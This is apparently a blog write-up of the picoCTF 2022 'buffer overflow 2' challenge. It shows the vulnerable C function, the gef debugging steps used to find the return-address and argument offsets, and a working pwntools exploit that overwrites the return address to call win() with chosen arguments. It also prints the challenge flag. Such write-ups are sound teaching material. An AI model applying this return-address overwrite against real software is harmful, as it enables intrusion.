---
layout: post
title: Buffer overflow with arguments - picoCTF 2022 buffer overflow 2
tags: [CTF, pwn]
---
> Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/345/vuln)? You can view source [here](https://artifacts.picoctf.net/c/345/vuln.c). And connect with it using `nc saturn.picoctf.net 56888`

## Check the source
The source code is simple. There's a buffer overflow happening and the target is to call the hidden function with the correct arguments.
```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

## Attack
First check how many bytes before the return address is overwritten.
```
gef➤  info frame
Stack level 0, frame at 0xffffcba4:
 eip = 0x62616164; saved eip = 0x62616165
 called by frame at 0xffffcba8
 Arglist at 0xffffcb9c, args: 
 Locals at 0xffffcb9c, Previous frame's sp is 0xffffcba4
 Saved registers:
  eip at 0xffffcba0
gef➤  pattern search $eip
[+] Searching for '$eip'
[+] Found at offset 112 (little-endian search) likely
[+] Found at offset 304 (big-endian search)
```
So dummy will be 112 bytes long. `info address` can be used to get the address of `win` function.
```
gef➤  info address win
Symbol "win" is at 0x8049296 in a file compiled without debugging.
```
Next is to get the offset of two arguments. First let's take a look at the disassembled `win` function.
```
0x0804930c <+118>:   cmp    DWORD PTR [ebp+0x8],0xcafef00d
0x08049313 <+125>:   jne    0x804932f <win+153>
0x08049315 <+127>:   cmp    DWORD PTR [ebp+0xc],0xf00df00d
0x0804931c <+134>:   jne    0x8049332 <win+156>
```
This is where the comparison happens. `ebp+0x8` and `ebp+0xc` are compared with the target value.

To find the offset, replace part of the pattern with `win`'s address so the program will jump there. Then, break at the `cmp` and examine the stack.
```python
from pwn import *

PATTERN = [REDACTED]

win = 0x8049296
arg1 = 0xcafef00d
arg2 = 0xf00df00d

ret_offset = 112

exploit = PATTERN[:ret_offset] + p32(win) + PATTERN[ret_offset + len(p32(win)):]

with open("./test", "wb") as f:
  f.write(exploit)
```
Now we are at the `cmp`, let's see what `$ebp+0x8` and `$ebp+0xc` look like.
```
gef➤  x $ebp+0x8
0xffffcba4:     0x62616166
gef➤  x $ebp+0xc
0xffffcba8:     0x62616167
```
Which are offset 120 and 124 respectively.

So the final exploit contains 112 bytes of dummy, then the address of `win`, then 4 more bytes of dummy, then the two value for comparison.
```python
from pwn import *

PATTERN = [REDACTED]

win = 0x8049296
arg1 = 0xcafef00d
arg2 = 0xf00df00d

ret_offset = 112
arg1_offset = 120
arg2_offset = 124

exploit = PATTERN[:ret_offset] + p32(win) + b"A" * 4 + p32(arg1) + p32(arg2)

# with open("./test", "wb") as f:
#   f.write(exploit)

r = remote("saturn.picoctf.net", 61076)
r.sendline(exploit)
r.interactive()
```
```
❯ python3 ./solve.py
[+] Opening connection to saturn.picoctf.net on port 61076: Done
[*] Switching to interactive mode
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaa\xf0\xfe\xca4AAAA
picoCTF{argum3nt5_4_d4yZ_4b24a3aa}$ [*] Got EOF while reading in interactive
$ 
$ 
[*] Interrupted
[*] Closed connection to saturn.picoctf.net port 61076
```